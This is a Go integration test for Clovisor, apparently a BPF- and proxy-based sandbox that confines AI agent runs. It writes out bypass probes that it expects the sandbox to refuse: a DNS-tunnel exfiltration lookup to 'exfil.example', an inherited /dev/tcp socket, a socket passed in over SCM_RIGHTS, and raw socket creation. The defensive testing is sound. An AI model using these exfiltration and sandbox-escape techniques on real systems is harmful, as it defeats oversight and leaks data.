// Copyright (c) Authors of Clovisor
//
// All rights reserved. This program and the accompanying materials
// are made available under the terms of the Apache License, Version 2.0
// which accompanies this distribution, and is available at
// http://www.apache.org/licenses/LICENSE-2.0

//go:build integration

package integration

// TestTransparent runs transparent enforce mode end to end (milestone
// 3.7): cgroup identity, the BPF hooks, the transparent listener, the
// forced resolver and the UDP lockdown, with clients that ignore the
// proxy. It needs a privileged container on a Linux host with BPF and
// cgroup v2, so it runs only when asked:
//
//	make integration-transparent     # DOCKER="sudo docker" if needed
//
// The agent container shares the host's cgroup and PID namespaces (the
// hooks attach to host cgroups, and the node agent finds Envoy by pid),
// but keeps runs under a cgroup of its own and pins in a bpffs of its
// own, so it does not disturb a node agent on the host. Envoy shares the
// agent container's network namespace, where the transparent listener
// and the resolver are on loopback.

import (
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"
)

func TestTransparent(t *testing.T) {
	if os.Getenv("CLOVISOR_IT_TRANSPARENT") == "" {
		t.Skip("set CLOVISOR_IT_TRANSPARENT=1: needs a privileged container, BPF and cgroup v2")
	}
	docker := strings.Fields(os.Getenv("DOCKER"))
	if len(docker) == 0 {
		docker = []string{"docker"}
	}
	if _, err := exec.LookPath(docker[0]); err != nil {
		t.Skip("docker not found")
	}
	var tag [4]byte
	rand.Read(tag[:])
	dir := t.TempDir()
	if os.Getenv("CLOVISOR_IT_KEEP") != "" {
		var err error
		if dir, err = os.MkdirTemp("", "clovisor-it-"); err != nil {
			t.Fatal(err)
		}
	}
	e := &env{t: t, docker: docker, tag: fmt.Sprintf("%x", tag), dir: dir}
	if err := os.Chmod(e.dir, 0o755); err != nil {
		t.Fatal(err)
	}
	e.build()
	e.buildBPF()
	e.pki()
	e.startTransparent()

	t.Run("status", e.testStatus)
	t.Run("https-ignoring-proxy", e.testTransparentHTTPS)
	t.Run("address-without-name", e.testAddressOnly)
	t.Run("raw-tcp-by-name", e.testRawByName)
	t.Run("dns", e.testForcedDNS)
	t.Run("udp", e.testUDP)
	t.Run("loopback", e.testLoopback)
	t.Run("inherited-socket", e.testInheritedSocket)
	t.Run("socket-families", e.testSocketFamilies)
	t.Run("passed-in-socket", e.testPassedInSocket)
	t.Run("unix-sockets", e.testUnixSockets)
	t.Run("exec", e.testExec)
	t.Run("tool-calls", e.testToolCalls)
	t.Run("sub-agents", e.testSubAgents)
	t.Run("run-udp-icmp", e.testRunNet)
	t.Run("check-transparent", e.testCheckTransparent)
	t.Run("fail-closed", e.testFailClosed) // last: stops the node agent
	if t.Failed() {
		out, _, _ := e.sh("cat /var/log/node-agent.log")
		t.Logf("node agent log:\n%s", out)
	}
}

// buildBPF compiles the BPF object into the shared bin directory.
func (e *env) buildBPF() {
	root, _ := filepath.Abs("..")
	cmd := exec.Command("make", "bpf")
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		e.t.Fatalf("make bpf: %v\n%s", err, out)
	}
	data, err := os.ReadFile(filepath.Join(root, "libclovisor/ebpf/agent_audit.o"))
	if err != nil {
		e.t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(e.dir, "bin", "agent_audit.o"), data, 0o644); err != nil {
		e.t.Fatal(err)
	}
}

func (e *env) agentsCgroup() string { return "clovisor-it-" + e.tag }

// py writes a Python script into the bin directory the containers mount,
// and returns the command that runs it: scripts run inside sh -c '...',
// where inline Python would need quoting.
func (e *env) py(name, src string) string {
	e.t.Helper()
	if err := os.WriteFile(filepath.Join(e.dir, "bin", name+".py"), []byte(src), 0o644); err != nil {
		e.t.Fatal(err)
	}
	return "python3 /it/bin/" + name + ".py"
}

// stopNodeAgent stops the node agent as an operator would (SIGINT).
func (e *env) stopNodeAgent() error {
	_, errOut, err := e.sh("kill -INT $(cat /run/node-agent.pid)")
	if err != nil {
		return fmt.Errorf("%v: %s", err, errOut)
	}
	return nil
}

// startTransparent brings up the origin (TLS, a banner port, a UDP echo),
// a privileged agent container with the node agent in transparent
// enforce mode, and Envoy in its network namespace.
func (e *env) startTransparent() {
	t := e.t
	t.Cleanup(e.cleanup)
	e.run("network", "create", e.name("net"))
	e.run("volume", "create", e.name("run"))
	e.startOrigin("-banner", ":2222", "-udp-echo", ":5000,:5002")
	e.originIP = strings.TrimSpace(e.run("inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", e.name("origin")))
	if e.originIP == "" {
		t.Fatal("no origin address")
	}
	e.run("run", "-d", "--name", e.name("agent"), "--network", e.name("net"),
		"--privileged", "--cgroupns", "host", "--pid", "host",
		"-v", filepath.Join(e.dir, "bin")+":/it/bin:ro", "-v", filepath.Join(e.dir, "origin", "ca.crt")+":/it/test-ca.crt:ro",
		"-v", e.name("run")+":/run/clovisor", agentImage, "sleep", "infinity")
	// Runs' cgroups go as runs end; the agents cgroup itself is removed
	// here, before the container goes (cleanups run last-in first-out).
	t.Cleanup(func() {
		if os.Getenv("CLOVISOR_IT_KEEP") == "" {
			e.stopNodeAgent()
			time.Sleep(time.Second)
			// A run that outlived the node agent (fail-closed) leaves
			// its cgroup; remove the runs first, then their parent.
			cg := "/sys/fs/cgroup/" + e.agentsCgroup()
			e.sh("for r in " + cg + "/run-*; do [ -d \"$r\" ] && rmdir \"$r\"; done; rmdir " + cg)
		}
	})
	if _, errOut, err := e.sh("mkdir -p /etc/clovisor && mount -t bpf bpf /sys/fs/bpf"); err != nil {
		t.Fatalf("prepare: %v %s", err, errOut)
	}
	e.run("cp", "policy-transparent", e.name("agent")+":/etc/clovisor/policy")
	// The policy names the origin by address (udp and icmp blocks); ping
	// sockets are for everyone, as on most distributions.
	if out, errOut, err := e.sh(`set -e
sed -i "s/ORIGIN_IP/` + e.originIP + `/g" /etc/clovisor/policy/*.yaml
echo "0 2147483647" > /proc/sys/net/ipv4/ping_group_range
chown -R root:root /etc/clovisor && chmod 755 /etc/clovisor/policy && chmod 644 /etc/clovisor/policy/*
cat /etc/ssl/certs/ca-certificates.crt /it/test-ca.crt > /run/clovisor/upstream.pem`); err != nil {
		t.Fatalf("prepare agent: %v\n%s%s", err, out, errOut)
	}
	e.run("exec", "-d", e.name("agent"), "sh", "-c",
		"echo $$ > /run/node-agent.pid; exec /it/bin/node-agent -identity cgroup -bpf /it/bin/agent_audit.o"+
			" -agents-cgroup "+e.agentsCgroup()+
			" -policy-dir /etc/clovisor/policy -proxy-listen 127.0.0.1:18000 -envoy-upstream-ca /run/clovisor/upstream.pem"+
			" -transparent enforce -udp-allow "+e.originIP+":5000 > /var/log/node-agent.log 2>&1")
	if out, errOut, err := e.sh(`for i in $(seq 50); do [ -S /run/clovisor/agent.sock ] && [ -f /run/clovisor/envoy.json ] && exit 0; sleep 0.1; done
cat /var/log/node-agent.log; exit 1`); err != nil {
		t.Fatalf("node agent did not start: %v\n%s%s", err, out, errOut)
	}
	e.run("run", "-d", "--name", e.name("envoy"), "--network", "container:"+e.name("agent"),
		"-v", e.name("run")+":/run/clovisor", EnvoyImage, "-c", "/run/clovisor/envoy.json", "-l", "warn")
	if out, errOut, err := e.sh(`for i in $(seq 100); do /it/bin/agentctl status 2>/dev/null | grep -q 'Healthy       yes' && exit 0; sleep 0.1; done
/it/bin/agentctl status; exit 1`); err != nil {
		logs, _ := e.dockerCmd("logs", e.name("envoy")).CombinedOutput()
		t.Fatalf("node not healthy: %v\n%s%s\n%s", err, out, errOut, logs)
	}
}

// trun runs script as a run under the transparent test profile, with the
// proxy variables removed: every client here ignores the proxy.
func (e *env) trun(script string) (string, string) {
	e.t.Helper()
	return e.agentRun("tp", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "+script)
}

// timeline returns a run's timeline as agentctl prints it in JSON, once
// the run has ended.
func (e *env) timeline(runID string) string {
	e.t.Helper()
	for i := 0; i < 50; i++ {
		if out, _, err := e.sh("/it/bin/agentctl events --json " + runID); err == nil && strings.Contains(out, `"ended_at"`) {
			return out
		}
		time.Sleep(100 * time.Millisecond)
	}
	out, errOut, _ := e.sh("/it/bin/agentctl events --json " + runID)
	e.t.Fatalf("no finished timeline for %s:\n%s%s", runID, out, errOut)
	return ""
}

func (e *env) testStatus(t *testing.T) {
	out, _, err := e.sh("/it/bin/agentctl status")
	if err != nil {
		t.Fatal(err)
	}
	expect(t, out, "Transparent   enforce", "Healthy       yes", "Proxy gated   yes", "Envoy ready   yes", "Sockets       ")
}

func (e *env) testTransparentHTTPS(t *testing.T) {
	out, id := e.trun(`
curl -sS https://origin.test/allowed
echo "secret: $(curl -s https://origin.test/secret)"`)
	expect(t, out, "origin.test GET /allowed", `"message":"The secret endpoint is off limits for this agent."`)
	expect(t, e.timeline(id), `"verdict": "redirect"`, `"transparent": true`, `"sni": "origin.test"`)
}

func (e *env) testAddressOnly(t *testing.T) {
	// TLS to the origin's address with no name: no rule names the
	// address, and the run never looked a name up for it.
	out, id := e.trun(`curl -sk -o /dev/null https://` + e.originIP + `/allowed || echo refused`)
	expect(t, out, "refused")
	expect(t, e.timeline(id), `"method": "CONNECT"`, `"decision": "deny"`)
}

func (e *env) testRawByName(t *testing.T) {
	// SSH-like raw TCP by name: allowed through the run's own lookup. A
	// port the rule does not name is refused (the proxy closes it).
	out, id := e.trun(e.py("raw", `import socket
s = socket.create_connection(("origin.test", 2222), timeout=5)
print("banner", s.recv(32))
s = socket.create_connection(("origin.test", 2223), timeout=5)
print("2223", s.recv(32))
`))
	expect(t, out, "banner b'SSH-2.0-origin", "2223 b''")
	expect(t, e.timeline(id), `"resolved_name": "origin.test"`)
}

func (e *env) testForcedDNS(t *testing.T) {
	out, id := e.trun(`
getent hosts origin.test >/dev/null && echo "origin resolved"
getent hosts other.test >/dev/null || echo "other refused"
getent hosts aGVsbG8gd29ybGQ.x7k2.exfil.example >/dev/null || echo "tunnel refused"
` + e.py("dns", `import socket
try:
    socket.getaddrinfo("other.test", 443)
except OSError as err:
    print("python:", err)
`))
	expect(t, out, "origin resolved", "other refused", "tunnel refused", "python:")
	expect(t, e.timeline(id), `"dns_blocked"`, `"other.test"`, `"agvsbg8gd29ybgq.x7k2.exfil.example"`)
}

func (e *env) testUDP(t *testing.T) {
	out, id := e.trun(e.py("udp", `import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
for dst in [("8.8.8.8", 443), ("`+e.originIP+`", 5001)]:
    try:
        s.sendto(b"x", dst)
        print("sent", dst)
    except OSError as err:
        print("refused", dst[1], err.errno)
s.sendto(b"ping", ("`+e.originIP+`", 5000))
print("echo", s.recvfrom(16)[0])
`))
	expect(t, out, "refused 443 1", "refused 5001 1", "echo b'ping'")
	// One report per unconnected socket: the first refusal.
	expect(t, e.timeline(id), `"udp_refused": 1`, `"udp_refused_to"`, `"8.8.8.8"`)
}

func (e *env) testLoopback(t *testing.T) {
	// A host service on loopback, outside any run.
	e.run("exec", "-d", e.name("agent"), "python3", "-m", "http.server", "8766", "--bind", "127.0.0.1")
	time.Sleep(time.Second)
	out, _ := e.trun(`
python3 -m http.server 8765 --bind 127.0.0.1 >/dev/null 2>&1 &
sleep 1
echo "same run: $(curl -s -o /dev/null -w %{http_code} http://127.0.0.1:8765/)"
echo "host: $(curl -s http://127.0.0.1:8766/)"
kill $!`)
	expect(t, out, "same run: 200", "host: {", "node-local address")
}

func (e *env) testInheritedSocket(t *testing.T) {
	// A TCP socket opened before the run, as standard input, would bypass
	// the hooks: the run is refused.
	_, errOut, err := e.sh(`bash -c 'exec 3<>/dev/tcp/` + e.originIP + `/2222; /it/bin/agentctl run --profile tp -- true <&3'`)
	if err == nil || !strings.Contains(errOut, "network sockets created outside the run") {
		t.Fatalf("run with an inherited socket: %v %s", err, errOut)
	}
}

// needLSM skips a test of the BPF LSM socket hooks where BPF LSM is not
// active on the host.
func (e *env) needLSM(t *testing.T) {
	out, _, _ := e.sh("/it/bin/agentctl status")
	if !strings.Contains(out, "Sockets       enforce") {
		t.Skip("BPF LSM not active on this host")
	}
}

func (e *env) testSocketFamilies(t *testing.T) {
	e.needLSM(t)
	out, id := e.trun(e.py("families", `import socket
for fam, typ, proto, name in [(socket.AF_INET, socket.SOCK_RAW, 1, "raw"), (17, socket.SOCK_RAW, 0, "packet"),
                              (40, socket.SOCK_STREAM, 0, "vsock"), (socket.AF_NETLINK, socket.SOCK_RAW, 0, "netlink")]:
    try:
        socket.socket(fam, typ, proto)
        print(name, "created")
    except OSError as err:
        print(name, "refused", err.errno)
`))
	expect(t, out, "raw refused 1", "packet refused 1", "vsock refused 1", "netlink created")
	expect(t, e.timeline(id), `"sockets_refused": 3`, `"create inet socket, type 3, protocol 1"`)
}

func (e *env) testPassedInSocket(t *testing.T) {
	// A process outside the run connects to the origin and hands the
	// socket over a Unix socket to a process in the run, after the run has
	// started: its sends would meet no cgroup hook.
	e.needLSM(t)
	pass := e.py("fdpass", `import array, os, socket, sys
mode, path = sys.argv[1], sys.argv[2]
if mode == "serve":
    tcp = socket.create_connection(("`+e.originIP+`", 2222), timeout=5)
    srv = socket.socket(socket.AF_UNIX)
    srv.bind(path)
    srv.listen(1)
    c, _ = srv.accept()
    c.sendmsg([b"x"], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", [tcp.fileno()]))])
else:
    u = socket.socket(socket.AF_UNIX)
    u.connect(path)
    _, anc, _, _ = u.recvmsg(1, socket.CMSG_LEN(4))
    s = socket.socket(fileno=array.array("i", anc[0][2])[0])
    try:
        s.sendall(b"x")
        print("sent on the passed-in socket")
    except OSError as err:
        print("passed-in socket refused", err.errno)
`)
	e.run("exec", "-d", e.name("agent"), "sh", "-c", "rm -f /tmp/fd.sock; "+pass+" serve /tmp/fd.sock")
	time.Sleep(time.Second)
	out, id := e.trun(pass + " use /tmp/fd.sock")
	expect(t, out, "passed-in socket refused 1")
	expect(t, e.timeline(id), `"send inet socket created outside the run`)
}

func (e *env) testUnixSockets(t *testing.T) {
	// Two sockets bound outside the run, one of them in unix.allow.
	e.needLSM(t)
	serve := e.py("unixserve", `import os, socket, sys
srv = socket.socket(socket.AF_UNIX)
if os.path.exists(sys.argv[1]):
    os.unlink(sys.argv[1])
srv.bind(sys.argv[1])
os.chmod(sys.argv[1], 0o777)
srv.listen(8)
while True:
    srv.accept()[0].close()
`)
	for _, p := range []string{"/run/it-allowed.sock", "/run/it-denied.sock"} {
		e.run("exec", "-d", e.name("agent"), "sh", "-c", serve+" "+p)
	}
	time.Sleep(time.Second)
	out, id := e.trun(e.py("unixuse", `import socket
def connect(path):
    s = socket.socket(socket.AF_UNIX)
    try:
        s.connect(path)
        return "ok"
    except OSError as err:
        return "refused %d" % err.errno
print("allowed", connect("/run/it-allowed.sock"))
print("denied", connect("/run/it-denied.sock"))
own = socket.socket(socket.AF_UNIX)
own.bind("\0it-own")
own.listen(1)
print("own", connect("\0it-own"))
`) + "; /it/bin/agentctl status | grep -c Transparent")
	expect(t, out, "allowed ok", "denied refused 1", "own ok", "\n1\n")
	expect(t, e.timeline(id), `"path": "/run/it-denied.sock"`, `"verdict": "refused: unix"`)
}

func (e *env) testExec(t *testing.T) {
	// Root-owned copies of true: one in /tmp, which anyone can write, so the
	// trusted-path test fails; one under /tmp/ok, which exec.allow names.
	e.needLSM(t)
	if _, errOut, err := e.sh("mkdir -p /tmp/ok && cp /bin/true /tmp/t && cp /bin/true /tmp/ok/t"); err != nil {
		t.Fatal(errOut)
	}
	out, id := e.trun(`
/bin/true && echo "system: ran"
/tmp/t && echo "tmp: ran" || echo "tmp: refused"
/tmp/ok/t && echo "allowed dir: ran"`)
	expect(t, out, "system: ran", "tmp: refused", "allowed dir: ran")
	tl := e.timeline(id)
	expect(t, tl, `"path": "/tmp/t"`, `"verdict": "refused: exec"`, `"trusted": false`)
}

func (e *env) testToolCalls(t *testing.T) {
	// Two tool calls, each in a cgroup of its own below the run; what each
	// does is attributed to it. A call from outside any run is refused.
	if _, errOut, err := e.sh("/it/bin/agentctl call -- true"); err == nil || !strings.Contains(errOut, "inside a run") {
		t.Fatalf("call outside a run: %v %s", err, errOut)
	}
	out, id := e.trun(`
/it/bin/agentctl call --name fetch -- curl -sS -o /dev/null -w "fetch %{http_code}\n" https://origin.test/allowed
/it/bin/agentctl call --name lookup -- getent hosts other.test || echo "lookup failed"
/it/bin/agentctl call --name status -- cat /proc/self/cgroup`)
	expect(t, out, "fetch 200", "lookup failed", "/call-3")
	tl := e.timeline(id)
	expect(t, tl, `"id": "call-1"`, `"name": "fetch"`, `"id": "call-2"`, `"name": "lookup"`, `"call": "call-1"`, `"call": "call-2"`)
}

// script writes a shell script into the bin directory the containers
// mount, and returns the command that runs it (see py).
func (e *env) script(name, src string) string {
	e.t.Helper()
	if err := os.WriteFile(filepath.Join(e.dir, "bin", name+".sh"), []byte(src), 0o644); err != nil {
		e.t.Fatal(err)
	}
	return "sh /it/bin/" + name + ".sh"
}

func (e *env) testSubAgents(t *testing.T) {
	// A tp run starts a sub-agent asking for tp-sub, which allows more
	// than tp in places: nested, it gets only what both allow (§7.8).
	e.needLSM(t)
	curl := `curl -sS -o /dev/null -w "%s %%{http_code}\n" https://origin.test/%s`
	sub := e.script("sub", strings.Join([]string{
		fmt.Sprintf(curl, "sub allowed", "allowed"),
		fmt.Sprintf(curl, "sub headers", "headers"), // tp-sub does not allow it
		fmt.Sprintf(curl, "sub secret", "secret"),   // tp does not
		`getent hosts other.test >/dev/null && echo "sub other: resolved" || echo "sub other: refused"`,
		`/tmp/t && echo "sub tmp: ran" || echo "sub tmp: refused"`,
		`P=$(sed -n "s|.*/run-\([0-9a-f]*\)/run-.*|\1|p" /proc/self/cgroup)`,
		`/it/bin/agentctl revoke $P 2>&1 | grep -q "runs nested in it" && echo "sub revoke parent: refused"`,
		`/it/bin/agentctl run --profile tp -- cat /proc/self/cgroup`,
		"",
	}, "\n"))
	out, id := e.trun("/it/bin/agentctl run --profile tp-sub -- " + sub + " 2>/tmp/sub.err; cat /tmp/sub.err")
	expect(t, out, "sub allowed 200", "sub headers 403", "sub secret 403", "sub other: refused", "sub tmp: refused",
		"sub revoke parent: refused", "nested in run "+id, "/run-"+id+"/run-")
	tl := e.timeline(id)
	expect(t, tl, `"children": [`)
	m := regexp.MustCompile(`agentctl: run ([0-9a-f]+) \(cgroup id \d+\), profile tp-sub@\S+ within run `).FindStringSubmatch(out)
	if m == nil {
		t.Fatalf("no nested run reported:\n%s", out)
	}
	stl := e.timeline(m[1])
	expect(t, stl, `"parent": "`+id+`"`, `"source": "run `+id+`: granted"`, `"profile": "tp-sub"`, `"verdict": "refused: exec"`)

	// Revoking the parent revokes the sub-agent already running.
	wait := e.script("wait", `while [ ! -f /tmp/go ]; do sleep 0.1; done
`+fmt.Sprintf(curl, "after revoke", "allowed")+"\n")
	out, _ = e.trun(`rm -f /tmp/go
(/it/bin/agentctl run --profile tp-sub -- ` + wait + ` 2>/dev/null) &
sleep 1
P=$(sed -n "s|.*/run-\([0-9a-f]*\)$|\1|p" /proc/self/cgroup)
/it/bin/agentctl revoke $P >/dev/null && echo revoked
touch /tmp/go
wait`)
	// Refused at the tunnel (the CONNECT, so no HTTP status) or inside it.
	expect(t, out, "revoked", "after revoke ")
	if strings.Contains(out, "after revoke 200") {
		t.Errorf("a revoked parent's sub-agent still reached the origin:\n%s", out)
	}
}

func (e *env) testRunNet(t *testing.T) {
	// tp and its ceiling both allow UDP to the origin's port 5002 and ping
	// to the origin (milestone 4.7); tp-sub allows neither, so a sub-agent
	// under tp gets neither.
	probe := e.py("net", `import socket, sys
ip = "`+e.originIP+`"
def udp(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2)
    try:
        s.sendto(b"hi", (ip, port))
        return "echo" if s.recvfrom(16)[0] == b"hi" else "?"
    except OSError as err:
        return "refused %s" % err.errno
def ping(dst):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_ICMP)
    s.settimeout(2)
    try:
        s.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x01clovisor", (dst, 0))
        return "reply" if s.recvfrom(64)[0][0] == 0 else "?"
    except OSError as err:
        return "refused %s" % (err.errno or "timeout")
who = sys.argv[1]
print(who, "udp5002", udp(5002))
print(who, "ping origin", ping(ip))
print(who, "ping other", ping("192.0.2.1"))
`)
	out, id := e.trun(probe + " run; /it/bin/agentctl run --profile tp-sub -- " + probe + " sub")
	expect(t, out, "run udp5002 echo", "run ping origin reply", "run ping other refused",
		"sub udp5002 refused 1", "sub ping origin refused", "sub ping other refused")
	if strings.Contains(e.timeline(id), `"udp_refused_to"`) {
		t.Errorf("granted UDP reported as refused")
	}
}

func (e *env) testCheckTransparent(t *testing.T) {
	_, id := e.trun("getent hosts other.test; " + e.py("udp443", `import socket
try:
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", ("8.8.8.8", 443))
except OSError:
    pass
`))
	e.timeline(id)
	out, _, _ := e.sh("/it/bin/agentctl check --transparent --profile /etc/clovisor/policy/tp.yaml " + id)
	expect(t, out, "as transparent enforce would decide", "dns    other.test", "udp    UDP 8.8.8.8:443")
}

func (e *env) testFailClosed(t *testing.T) {
	// A run already going when the node agent stops: its next connect,
	// and its next lookup, are refused.
	conn := e.py("fc", `import socket
try:
    socket.create_connection(("`+e.originIP+`", 2222), timeout=3)
    print("connected")
except OSError as err:
    print("connect errno", err.errno)
`)
	e.run("exec", "-d", e.name("agent"), "sh", "-c",
		`/it/bin/agentctl run --profile tp -- sh -c 'sleep 3; `+conn+` > /tmp/fc.conn 2>&1; `+
			`getent hosts origin.test > /tmp/fc.dns 2>&1; echo $? >> /tmp/fc.dns' > /tmp/fc.run 2>&1`)
	time.Sleep(time.Second)
	if err := e.stopNodeAgent(); err != nil {
		t.Fatalf("stop node agent: %v", err)
	}
	time.Sleep(4 * time.Second)
	out, _, _ := e.sh("cat /tmp/fc.conn /tmp/fc.dns; ls /sys/fs/bpf/clovisor/")
	expect(t, out, "connect errno 1", "transparent-connect4")
	if !strings.Contains(out, "\n2\n") {
		t.Errorf("lookup not refused with the node agent down:\n%s", out)
	}
}
